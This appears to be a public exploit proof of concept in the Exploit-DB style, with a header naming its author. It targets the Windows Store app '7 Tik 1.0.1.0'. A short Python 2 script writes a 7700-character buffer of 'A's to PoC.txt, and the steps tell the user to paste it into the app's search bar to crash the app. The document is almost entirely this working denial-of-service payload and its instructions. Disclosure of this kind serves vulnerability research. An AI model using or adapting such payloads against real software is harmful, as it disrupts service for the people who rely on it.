# Exploit Title: 7 Tik 1.0.1.0 - Denial of Service (PoC)
# Date: 1/18/2018
# Author: 0xB9
# Twitter: @0xB9Sec
# Contact: 0xB9[at]pm.me
# Software Link: https://www.microsoft.com/store/productId/9NQL2QC8S935
# Version: 1.0.1.0
# Tested on: Windows 10

# Proof of Concept:
# Run the python script, it will create a new file "PoC.txt"
# Copy the text from the generated PoC.txt file to clipboard
# Go to search page
# Paste the text in the search bar and click search
# App will now crash

buffer = "A" * 7700
payload = buffer
try:
    f=open("PoC.txt","w")
    print "[+] Creating %s evil payload.." %len(payload)
    f.write(payload)
    f.close()
    print "[+] File created!"
except:
    print "File cannot be created"